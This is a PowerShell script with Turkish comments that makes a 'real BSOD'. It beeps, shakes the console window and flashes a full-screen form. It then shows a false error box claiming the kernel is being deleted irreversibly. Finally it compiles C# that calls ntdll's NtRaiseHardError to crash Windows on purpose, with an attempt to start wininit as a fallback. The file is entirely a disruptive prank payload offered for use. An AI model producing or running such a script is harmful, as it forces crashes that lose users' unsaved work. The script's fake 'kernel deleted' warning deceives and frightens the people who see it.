# ============================================================
# EN – GERÇEK BSOD TETİKLEME (Vİİİ + PATLAMA + SALLAMA)
# ============================================================

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Runtime.InteropServices

# Pencere sallama için Windows API
$MoveWindow = Add-Type -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
'@ -Name "WinAPI" -Namespace "Console" -PassThru

try {
    $hWnd = [Console.WinAPI]::GetConsoleWindow()

    # 1. Vİİİİİ sesi (yükselen frekans)
    Write-Host "[EN] Vİİİİİİİİİİ!" -ForegroundColor Red -BackgroundColor Black
    for ($i=0; $i -lt 20; $i++) {
        $freq = 500 + ($i * 100)
        [System.Console]::Beep($freq, 100)
        Start-Sleep -Milliseconds 50
        # Pencere sallama
        $x = Get-Random -Min -20 -Max 20
        $y = Get-Random -Min -20 -Max 20
        [Console.WinAPI]::MoveWindow($hWnd, $x, $y, 800, 600, $true)
    }
    [Console.WinAPI]::MoveWindow($hWnd, 0, 0, 800, 600, $true)

    # 2. Patlama efekti (beyaz-kırmızı-siyah)
    $form = New-Object System.Windows.Forms.Form
    $form.WindowState = 'Maximized'
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.BackColor = 'White'
    $form.Show()
    Start-Sleep -Milliseconds 300
    $form.BackColor = 'Black'
    Start-Sleep -Milliseconds 200
    $form.BackColor = 'Red'
    Start-Sleep -Milliseconds 200
    $form.BackColor = 'White'
    Start-Sleep -Milliseconds 200
    $form.Close()

    # 3. BSOD Uyarısı
    [System.Windows.Forms.MessageBox]::Show(
        "SİSTEM ÇÖKTÜ! KERNEL SİLİNİYOR!" +
        "`n`nBu işlem geri alınamaz.",
        "EN - BSOD",
        "OK",
        "Error"
    )

    # 4. Gerçek BSOD tetikleme
    $code = @'
using System;
using System.Runtime.InteropServices;
public class BSOD {
    [DllImport("ntdll.dll")]
    public static extern int NtRaiseHardError(int ErrorStatus, int NumberOfParameters, int UnicodeStringParameterMask, IntPtr Parameters, int ResponseOption, ref int Response);
    public static void Crash() {
        int resp = 0;
        NtRaiseHardError(0xC0000001, 0, 0, IntPtr.Zero, 0x20, ref resp);
    }
}
'@
    Add-Type -TypeDefinition $code
    [BSOD]::Crash()

} catch {
    try { Start-Process wininit } catch {}
}